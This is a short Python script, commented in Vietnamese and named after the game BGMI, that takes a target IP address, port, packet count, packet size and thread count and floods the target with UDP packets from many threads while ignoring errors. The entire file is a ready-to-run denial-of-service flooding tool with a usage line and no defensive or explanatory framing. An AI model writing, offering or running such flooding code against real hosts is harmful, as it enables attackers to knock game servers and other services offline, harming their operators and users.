#!/usr/bin/env python3
import sys
import socket
import threading

# Kiểm tra tham số
if len(sys.argv) < 6:
    print("Usage: ./bgmi.py <IP> <PORT> <NUM_PACKETS> <PACKET_SIZE> <NUM_THREADS>")
    sys.exit(1)

# Lấy tham số từ argv
IP = sys.argv[1]
PORT = int(sys.argv[2])
NUM_PACKETS = int(sys.argv[3])
PACKET_SIZE = int(sys.argv[4])
NUM_THREADS = int(sys.argv[5])

# Dữ liệu gửi
data = bytearray(PACKET_SIZE)

# Hàm spam UDP
def spam():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(NUM_PACKETS):
        try:
            sock.sendto(data, (IP, PORT))
        except:
            pass

# Tạo các thread
threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=spam)
    t.start()
    threads.append(t)

# Chờ tất cả thread xong
for t in threads:
    t.join()

print(f"Finished sending {NUM_PACKETS} packets of size {PACKET_SIZE} bytes to {IP}:{PORT}")